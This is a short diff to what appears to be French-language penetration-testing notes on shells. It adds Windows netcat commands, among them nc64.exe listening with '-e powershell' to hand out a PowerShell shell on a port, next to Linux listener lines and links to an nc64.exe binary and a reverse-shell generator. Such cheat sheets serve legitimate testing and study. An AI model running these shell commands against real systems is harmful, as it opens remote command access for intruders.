@@ -85,8 +85,11 @@ nc -lvnp 4444
 rlwrap nc -nnvp 4443
 ncat -lvnp 12345 --ssl
 ```
-Windows :
-
+Windows -> création de raccourcis !
+```
+nc64.exe -l -v -n -p 4444 -e powershell
+nc64.exe 127.0.0.1 4444
+```
 https://github.com/int0x33/nc.exe/blob/master/nc64.exe
 
 https://www.revshells.com/
